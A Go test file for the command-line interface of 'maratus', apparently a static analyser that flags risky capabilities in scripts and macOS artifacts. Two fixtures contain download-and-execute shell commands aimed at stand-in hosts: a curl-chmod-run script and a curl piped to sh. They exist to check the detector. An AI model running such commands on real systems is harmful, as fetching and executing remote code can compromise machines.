package main

import (
	"bytes"
	"encoding/json"
	"errors"
	"flag"
	"io"
	"os"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"testing"

	"github.com/0x4D31/maratus/internal/artifact"
	"github.com/0x4D31/maratus/internal/report"
	ruleengine "github.com/0x4D31/maratus/internal/rules"
)

func TestInspectArtifactJSON(t *testing.T) {
	script := filepath.Join(t.TempDir(), "install.sh")
	if err := os.WriteFile(script, []byte("curl https://payload.example/x -o /tmp/x\nchmod +x /tmp/x\n/tmp/x\n"), 0o700); err != nil {
		t.Fatal(err)
	}
	data := captureStdout(t, func() error {
		return run([]string{"inspect", script, "--format", "json"})
	})
	var rep report.Report
	if err := json.Unmarshal(data, &rep); err != nil {
		t.Fatal(err)
	}
	if rep.SchemaVersion != report.SchemaVersion || !hasCapability(rep, "macos.download-execute") {
		t.Fatalf("unexpected inspect report: %#v", rep)
	}
}

func TestInspectStdinShellUsesBoundedInlinePipeline(t *testing.T) {
	command := "curl https://inline.example/install.sh | sh\n"
	data := captureStdout(t, func() error {
		return runInspectWithInput([]string{"--stdin", "--input-kind", "shell", "--format", "json"}, strings.NewReader(command))
	})
	var rep report.Report
	if err := json.Unmarshal(data, &rep); err != nil {
		t.Fatal(err)
	}
	if rep.Artifact != "<stdin:shell>" || !hasCapability(rep, "macos.download-pipe-interpreter") {
		t.Fatalf("stdin shell was not analyzed through the ordinary pipeline: %#v", rep)
	}
	if len(rep.ArtifactNodes) != 1 {
		t.Fatalf("stdin inspection followed host targets: %#v", rep.ArtifactNodes)
	}
}

func TestInspectStdinValidation(t *testing.T) {
	tests := []struct {
		name  string
		args  []string
		input string
		want  string
	}{
		{name: "kind required", args: []string{"--stdin"}, input: "echo ok", want: "requires --input-kind"},
		{name: "path conflict", args: []string{"--stdin", "--input-kind", "shell", "sample"}, input: "echo ok", want: "does not accept a path"},
		{name: "kind without stdin", args: []string{"--input-kind", "shell", "sample"}, want: "requires --stdin"},
		{name: "unknown kind", args: []string{"--stdin", "--input-kind", "unknown"}, input: "echo ok", want: "unsupported inline input kind"},
		{name: "removed auto kind", args: []string{"--stdin", "--input-kind", "auto"}, input: "echo ok", want: "unsupported inline input kind"},
		{name: "blank shell", args: []string{"--stdin", "--input-kind", "shell"}, input: " \n\t", want: "shell input must not be blank"},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			err := runInspectWithInput(test.args, strings.NewReader(test.input))
			if err == nil || !strings.Contains(err.Error(), test.want) {
				t.Fatalf("error = %v, want %q", err, test.want)
			}
		})
	}

	err := runInspectWithInput(
		[]string{"--stdin", "--input-kind", "text", "--max-file-bytes", "4"},
		strings.NewReader("12345"),
	)
	if err == nil || !strings.Contains(err.Error(), "exceeds --max-file-bytes 4") {
		t.Fatalf("oversized stdin error = %v", err)
	}

	err = runInspectWithInput(
		[]string{"--stdin", "--input-kind", "text", "--max-file-bytes", "10", "--max-total-bytes", "4"},
		strings.NewReader("12345"),
	)
	if err == nil || !strings.Contains(err.Error(), "exceeds --max-total-bytes 4") {
		t.Fatalf("aggregate-limit stdin error = %v", err)
	}
}

func TestInspectRejectsSavedReportAndPreservesOrdinaryJSON(t *testing.T) {
	root := t.TempDir()
	saved := filepath.Join(root, "saved.json")
	if err := os.WriteFile(saved, []byte(savedReportJSONForTest("saved-artifact", "")), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := run([]string{"inspect", saved}); err == nil || !strings.Contains(err.Error(), "use maratus render") || exitCode(err) != 2 {
		t.Fatalf("saved-report inspect error = %v, code %d", err, exitCode(err))
	}

	ordinary := filepath.Join(root, "package.json")
	if err := os.WriteFile(ordinary, []byte(`{"name":"ordinary"}`), 0o600); err != nil {
		t.Fatal(err)
	}
	data := captureStdout(t, func() error { return run([]string{"inspect", ordinary, "--format", "json"}) })
	var rep report.Report
	if err := json.Unmarshal(data, &rep); err != nil {
		t.Fatal(err)
	}
	if rep.Artifact != ordinary {
		t.Fatalf("ordinary JSON was not inspected: %#v", rep)
	}
}

func TestInspectDoesNotMislabelFilesystemErrorsAsInvalidReports(t *testing.T) {
	missing := filepath.Join(t.TempDir(), "missing")
	err := run([]string{"inspect", missing})
	if err == nil || errors.Is(err, report.ErrRecognizedReport) {
		t.Fatalf("missing artifact error = %v", err)
	}
	if strings.Contains(err.Error(), "identifies as a Maratus report") || !strings.Contains(err.Error(), "inspect artifact") {
		t.Fatalf("misleading missing-artifact error = %v", err)
	}
}

func TestRenderPreservesSavedProvenance(t *testing.T) {
	path := filepath.Join(t.TempDir(), "saved.maratus.json")
	data := savedReportJSONForTest("saved-artifact", "")
	data = strings.Replace(data, `"tool_version":"test"`, `"tool_version":"source-build"`, 1)
	data = strings.Replace(data, `"ruleset_version":"`+report.RulesetVersion+`"`, `"ruleset_version":"source-rules"`, 1)
	if err := os.WriteFile(path, []byte(data), 0o600); err != nil {
		t.Fatal(err)
	}
	output := captureStdout(t, func() error { return run([]string{"render", path, "--format", "json"}) })
	var rep report.Report
	if err := json.Unmarshal(output, &rep); err != nil {
		t.Fatal(err)
	}
	if rep.ToolVersion != "source-build" || rep.RulesetVersion != "source-rules" || rep.Artifact != "saved-artifact" {
		t.Fatalf("render replaced saved provenance: %#v", rep)
	}
}

func TestRenderRejectsForgedCapabilityProjection(t *testing.T) {
	root := t.TempDir()
	script := filepath.Join(root, "sample.sh")
	if err := os.WriteFile(script, []byte("/tmp/original\n"), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := report.InspectPath(script, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	capabilityIndex := -1
	for index, capability := range rep.Capabilities {
		if capability.RuleID == "macos.file-execution" && len(capability.AffectedResources) > 0 {
			capabilityIndex = index
			break
		}
	}
	if capabilityIndex < 0 {
		t.Fatalf("fixture produced no file-execution capability: %#v", rep.Capabilities)
	}
	rep.Capabilities[capabilityIndex].AffectedResources[0].Value = "/tmp/forged"
	var encoded bytes.Buffer
	if err := report.WriteJSON(&encoded, rep); err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(root, "forged.maratus.json")
	if err := os.WriteFile(path, encoded.Bytes(), 0o600); err != nil {
		t.Fatal(err)
	}
	err = run([]string{"render", path})
	if err == nil || !strings.Contains(err.Error(), "is not physically bound to a supporting operation") {
		t.Fatalf("render forged projection error = %v", err)
	}
}

func TestOutputFormatDetailAndColorValidation(t *testing.T) {
	path := filepath.Join(t.TempDir(), "saved.json")
	if err := os.WriteFile(path, []byte(savedReportJSONForTest("sample", "")), 0o600); err != nil {
		t.Fatal(err)
	}
	for _, args := range [][]string{
		{"render", path, "--format", "yaml"},
		{"render", path, "--format", "json", "--detail", "full"},
		{"render", path, "--format", "json", "--color", "always"},
		{"render", path, "--format", "text", "--detail", "everything"},
		{"render", path, "--format", "text", "--title", "wrong"},
	} {
		if err := run(args); err == nil || exitCode(err) != 2 {
			t.Fatalf("invalid output args %v error = %v, code %d", args, err, exitCode(err))
		}
	}
	text := captureStdout(t, func() error { return run([]string{"render", path, "--detail", "full", "--color", "never"}) })
	if !bytes.Contains(text, []byte("saved")) && !bytes.Contains(text, []byte("sample")) {
		t.Fatalf("full text render missing report content:\n%s", text)
	}
	_ = captureStdout(t, func() error {
		return run([]string{"render", path, "--format", "json", "--detail", " SUMMARY ", "--color", " NEVER "})
	})
}

func TestRulesRequiresExplicitListAndSupportsJSON(t *testing.T) {
	if err := run([]string{"rules"}); err == nil || exitCode(err) != 2 || !strings.Contains(err.Error(), "requires a subcommand") {
		t.Fatalf("rules error = %v", err)
	}
	text := captureStdout(t, func() error { return run([]string{"rules", "list"}) })
	if !bytes.Contains(text, []byte("macos.download-execute")) || bytes.Contains(text, []byte("A statically modeled sequence")) {
		t.Fatalf("concise catalog output = %s", text)
	}
	verbose := captureStdout(t, func() error { return run([]string{"rules", "list", "--detail", "evidence"}) })
	if !bytes.Contains(verbose, []byte("A statically modeled sequence")) {
		t.Fatalf("detailed catalog missing descriptions: %s", verbose)
	}
	data := captureStdout(t, func() error { return run([]string{"rules", "list", "--format", "json"}) })
	var info report.RuleInfo
	if err := json.Unmarshal(data, &info); err != nil {
		t.Fatal(err)
	}
	if info.SchemaVersion != report.RuleCatalogSchemaVersion || info.RuleCatalogDigest != ruleengine.CatalogDigest() || len(info.Rules) == 0 {
		t.Fatalf("rule catalog = %#v", info)
	}
	var foundLibrary, foundConsumer bool
	for _, entry := range info.Rules {
		if entry.ID == "library.package-json-install-lifecycle-root" {
			foundLibrary = entry.Kind == ruleengine.LibraryRule && len(entry.LibraryRuleIDs) == 0
		}
		if entry.ID == "package.package-json-lifecycle" {
			foundConsumer = entry.Kind == ruleengine.CapabilityRule && slices.Equal(entry.LibraryRuleIDs, []string{"library.package-json-install-lifecycle-root"})
		}
	}
	if !foundLibrary || !foundConsumer {
		t.Fatalf("rule catalog omitted typed library dependency entries: %#v", info.Rules)
	}
}

func TestRulesCheckValidatesGeneratedSpecs(t *testing.T) {
	text := captureStdout(t, func() error { return run([]string{"rules", "check"}) })
	want := "valid: " + strconv.Itoa(len(report.ListRules().Rules)) + " rule specs checked"
	if !bytes.Contains(text, []byte(want)) {
		t.Fatalf("rules check output = %s", text)
	}
	data := captureStdout(t, func() error {
		return run([]string{"rules", "check", "macos.download-execute", "--format", "json"})
	})
	var result ruleCheckResult
	if err := json.Unmarshal(data, &result); err != nil {
		t.Fatal(err)
	}
	if !result.Valid || result.Checked != 1 || result.RuleID != "macos.download-execute" || result.Diagnostics == nil {
		t.Fatalf("rule check result = %#v", result)
	}
}

func TestRulesVocabIsDeterministicAndMachineReadable(t *testing.T) {
	text := captureStdout(t, func() error { return run([]string{"rules", "vocab"}) })
	for _, want := range []string{"pattern nodes: operation", "archive.create", "local_output (required): file", "operation -> resource"} {
		if !bytes.Contains(text, []byte(want)) {
			t.Fatalf("rules vocab text missing %q:\n%s", want, text)
		}
	}
	first := captureStdout(t, func() error { return run([]string{"rules", "vocab", "--format", "json"}) })
	second := captureStdout(t, func() error { return run([]string{"rules", "vocab", "--format", "json"}) })
	if !bytes.Equal(first, second) {
		t.Fatalf("rules vocab JSON is nondeterministic:\n%s\n%s", first, second)
	}
	var vocabulary struct {
		SchemaVersion        string   `json:"schema_version"`
		PatternNodes         []string `json:"pattern_nodes"`
		OperationConstraints []string `json:"operation_constraints"`
		EachConstraints      []string `json:"each_constraints"`
		RelationConstraints  []string `json:"relation_constraints"`
		OperationKinds       []struct {
			Kind string `json:"kind"`
		} `json:"operation_kinds"`
	}
	if err := json.Unmarshal(first, &vocabulary); err != nil {
		t.Fatal(err)
	}
	if vocabulary.SchemaVersion != ruleengine.VocabularySchemaVersion || !slices.Equal(vocabulary.PatternNodes, []string{"operation", "feature", "execution-root", "library-rule", "any", "each", "relate", "resource-flow"}) || !slices.Equal(vocabulary.EachConstraints, []string{"same-context", "same-execution-root", "shared-evidence"}) || !slices.Equal(vocabulary.RelationConstraints, []string{"related-by"}) || len(vocabulary.OperationKinds) == 0 {
		t.Fatalf("rules vocabulary = %#v", vocabulary)
	}
	for _, args := range [][]string{{"rules", "vocab", "extra"}, {"rules", "vocab", "--format", "yaml"}} {
		if err := run(args); err == nil || exitCode(err) != 2 {
			t.Fatalf("invalid vocab args %v error = %v", args, err)
		}
	}
}

func TestTopLevelAndRoutedHelp(t *testing.T) {
	top := captureStdout(t, func() error { return run([]string{"--help"}) })
	for _, want := range []string{"maratus inspect", "maratus render", "maratus rules list", "maratus rules check", "maratus rules vocab", "--input-kind"} {
		if !bytes.Contains(top, []byte(want)) {
			t.Fatalf("top-level help missing %q:\n%s", want, top)
		}
	}
	for _, test := range []struct {
		args []string
		want string
	}{
		{[]string{"help", "inspect"}, "--include-unreferenced"},
		{[]string{"help", "render"}, "--format FORMAT"},
		{[]string{"help", "rules", "list"}, "rules list"},
		{[]string{"help", "rules", "check"}, "stable codes"},
		{[]string{"help", "rules", "vocab"}, "authoritative operation"},
		{[]string{"inspect", "--help"}, "--input-kind"},
		{[]string{"render", "--help"}, "self-contained HTML"},
		{[]string{"rules", "list", "--help"}, "built-in capability and library rule catalog"},
		{[]string{"rules", "check", "--help"}, "validates every generated rule Spec"},
		{[]string{"rules", "vocab", "--help"}, "expression nodes are omitted"},
	} {
		data := captureStdout(t, func() error { return run(test.args) })
		if !strings.Contains(string(data), test.want) {
			t.Fatalf("help %v missing %q:\n%s", test.args, test.want, data)
		}
	}
}

func TestVersionAndExitCodeClassification(t *testing.T) {
	for _, args := range [][]string{{"version"}, {"--version"}} {
		data := captureStdout(t, func() error { return run(args) })
		if !strings.HasPrefix(string(data), "maratus ") {
			t.Fatalf("version output = %q", data)
		}
	}
	if err := run([]string{"version", "extra"}); err == nil || exitCode(err) != 2 {
		t.Fatalf("version argument error = %v", err)
	}
	if exitCode(errors.New("failure")) != 1 || exitCode(flag.ErrHelp) != 0 || exitCode(nil) != 0 {
		t.Fatal("unexpected exit-code classification")
	}
}

func TestInterspersedParsingDerivesFlagArityFromRegistration(t *testing.T) {
	fs := newFlagSet("test")
	name := fs.String("name", "", "fixture")
	enabled := fs.Bool("enabled", false, "fixture")
	positionals, err := parseInterspersed(fs, []string{"first", "--name", "--help", "--enabled", "second"})
	if err != nil {
		t.Fatal(err)
	}
	if *name != "--help" || !*enabled || strings.Join(positionals, ",") != "first,second" {
		t.Fatalf("parsed name=%q enabled=%v positionals=%#v", *name, *enabled, positionals)
	}
	fs = newFlagSet("help")
	fs.String("name", "", "fixture")
	if wantsHelp(fs, []string{"--name", "--help"}) {
		t.Fatal("option value was mistaken for a help flag")
	}
}

func TestRemovedCLIFormsAndLegacyFlagsAreRejected(t *testing.T) {
	for _, args := range [][]string{
		{"preflight", "--cmd", "echo ok"},
		{"visualize", "report.json"},
		{"compare", "a", "b"},
		{"dataset", "a"},
		{"inspect", "--deep", "sample"},
		{"inspect", "--no-archives", "sample"},
		{"inspect", "--json", "sample"},
		{"inspect", "-v", "sample"},
		{"rules", "evaluate", "sample"},
	} {
		if err := run(args); err == nil || exitCode(err) != 2 {
			t.Fatalf("removed CLI form %v error = %v, code %d", args, err, exitCode(err))
		}
	}
}

func TestAnalysisFlagNamesMapWithoutChangingInternalOptions(t *testing.T) {
	fs := newFlagSet("test")
	options := addAnalysisFlags(fs)
	if err := fs.Parse([]string{"--expand-containers=false", "--include-unreferenced", "--architecture", "ARM64"}); err != nil {
		t.Fatal(err)
	}
	got, err := validatedOptions(options)
	if err != nil {
		t.Fatal(err)
	}
	if !got.DisableContainerExpansion || !got.IncludeUnreferenced || got.Architecture != "arm64" {
		t.Fatalf("mapped options = %#v", got)
	}

	fs = newFlagSet("conflict")
	options = addAnalysisFlags(fs)
	if err := fs.Parse([]string{"--expand-containers=false", "--allow-dmg-mount"}); err != nil {
		t.Fatal(err)
	}
	if _, err := validatedOptions(options); err == nil || !strings.Contains(err.Error(), "--expand-containers=false") {
		t.Fatalf("container/DMG conflict = %v", err)
	}
}

func TestAnalysisLimitsAndByteSizes(t *testing.T) {
	fs := newFlagSet("test")
	options := addAnalysisFlags(fs)
	if err := fs.Parse([]string{
		"--max-file-bytes", "1024",
		"--max-archive-bytes", "2KiB",
		"--max-expanded-bytes", "3MiB",
		"--max-total-bytes", "4GiB",
	}); err != nil {
		t.Fatal(err)
	}
	got := options()
	if got.MaxFileBytes != 1024 || got.MaxArchiveBytes != 2<<10 || got.MaxExpandedBytes != 3<<20 || got.MaxTotalBytes != 4<<30 {
		t.Fatalf("parsed byte budgets = %#v", got)
	}
	for _, input := range []string{"1KB", "1MIB", "9223372036854775808", "8589934592GiB"} {
		if value, err := parseByteSize(input); err == nil {
			t.Fatalf("parseByteSize(%q) = %d, want error", input, value)
		}
	}

	for _, test := range []struct {
		flag  string
		value string
		want  string
	}{
		{"--max-file-bytes", "0", "must be positive"},
		{"--max-archive-depth", "-1", "invalid --max-archive-depth"},
		{"--max-artifact-nodes", strconv.Itoa(artifact.DefaultMaxArtifactNodes + 1), "keeps emitted reports reloadable"},
		{"--max-evidence", strconv.Itoa(artifact.DefaultMaxEvidence + 1), "keeps emitted reports reloadable"},
		{"--architecture", "ppc", "invalid --architecture"},
	} {
		err := run([]string{"inspect", test.flag, test.value, "sample"})
		if err == nil || !strings.Contains(err.Error(), test.want) || exitCode(err) != 2 {
			t.Fatalf("%s=%s error = %v, code %d", test.flag, test.value, err, exitCode(err))
		}
	}
}

func TestEnvironmentBackedPasswordAndDMGOption(t *testing.T) {
	t.Setenv(zipPasswordEnv, "environment-secret")
	fs := newFlagSet("test")
	options := addAnalysisFlags(fs)
	if err := fs.Parse([]string{"--allow-dmg-mount"}); err != nil {
		t.Fatal(err)
	}
	if got := options(); !got.AllowDMGMount || got.ZipPassword != "environment-secret" {
		t.Fatalf("environment-backed options = %#v", got)
	}
}

func TestTerminalErrorEscapesUntrustedControls(t *testing.T) {
	got := terminalError(errors.New("bad\x1b[31m\nvalue"))
	if strings.ContainsAny(got, "\x1b\n") || !strings.Contains(got, `\x1b`) || !strings.Contains(got, `\n`) {
		t.Fatalf("terminalError() = %q", got)
	}
}

func savedReportJSONForTest(artifactName, extra string) string {
	fields := []string{
		"relationships", "scopes", "analysis_selection", "execution_roots", "invoked_targets", "capability_matches", "features",
		"operations", "operation_relations", "artifact_properties", "network_implementations", "coverage", "evidence",
		"diagnostics",
	}
	var suffix strings.Builder
	for _, field := range fields {
		if strings.Contains(extra, `"`+field+`"`) {
			continue
		}
		suffix.WriteString(`,"` + field + `":[]`)
	}
	if extra != "" {
		suffix.WriteByte(',')
		suffix.WriteString(extra)
	}
	quoted := strconv.Quote(artifactName)
	return `{"schema_version":"` + report.SchemaVersion + `","tool":"maratus","tool_version":"test","ruleset_version":"` + report.RulesetVersion + `","rule_catalog_digest":"` + ruleengine.CatalogDigest() + `","analysis":{"expand_containers":true,"include_unreferenced":false,"allow_dmg_mount":false,"architecture":"all","max_file_bytes":1,"max_archive_bytes":1,"max_expanded_bytes":1,"max_total_bytes":1,"max_archive_depth":1,"max_directory_depth":1,"max_compression_ratio":1,"max_artifact_nodes":1,"max_artifact_path_bytes":1,"max_evidence":1,"max_diagnostics":1,"max_diagnostic_bytes":1,"zip_password_supplied":false},"artifact":` + quoted +
		`,"artifact_nodes":[{"id":"node-1","logical_path":` + quoted + `,"kind":"text","analysis_status":"analyzed"}]` + suffix.String() + `}`
}

func hasCapability(rep report.Report, ruleID string) bool {
	for _, capabilityMatch := range rep.Capabilities {
		if capabilityMatch.RuleID == ruleID {
			return true
		}
	}
	return false
}

func captureStdout(t *testing.T, fn func() error) []byte {
	t.Helper()
	stdout := os.Stdout
	readEnd, writeEnd, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = readEnd.Close() })
	type captureResult struct {
		data []byte
		err  error
	}
	result := make(chan captureResult, 1)
	go func() {
		data, readErr := io.ReadAll(readEnd)
		result <- captureResult{data: data, err: readErr}
	}()
	os.Stdout = writeEnd
	runErr := fn()
	_ = writeEnd.Close()
	os.Stdout = stdout
	captured := <-result
	if runErr != nil {
		t.Fatal(runErr)
	}
	if captured.err != nil {
		t.Fatal(captured.err)
	}
	return captured.data
}
